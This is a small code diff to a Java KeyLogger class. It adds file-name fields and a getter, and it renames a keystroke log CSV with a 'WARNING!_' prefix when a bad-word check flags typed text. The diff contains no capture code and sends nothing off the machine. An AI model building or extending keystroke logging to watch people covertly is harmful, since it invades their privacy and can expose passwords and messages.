@@ -16,6 +16,9 @@ public abstract class KeyLogger {
     String filePath = "src/main/java/logger/logs/" + getCurrentTime() + ".csv";
     String warningFilePath = "src/main/java/logger/logs/" + "WARNING!_" + getCurrentTime() + ".csv";
 
+    String fileName = getCurrentTime() + ".csv";
+    String warningFileName = "WARNING!_" + getCurrentTime() + ".csv";
+
 
     String message;
     String sendKey;
@@ -36,6 +39,7 @@ public abstract class KeyLogger {
         if(checkForBadWords(message)) {
             File oldFile = new File(filePath);
             filePath = warningFilePath;
+            fileName = warningFileName;
             File newFile = new File(warningFilePath);
             if(oldFile.renameTo(newFile)){
                 System.out.println("Rename succesful");
@@ -101,6 +105,10 @@ public abstract class KeyLogger {
 
     public String getFilePath() {
         return filePath;
+    }
+
+    public String getFileName() {
+        return fileName;
     }
 
     public void nativeKeyReleased(NativeKeyEvent e) { }
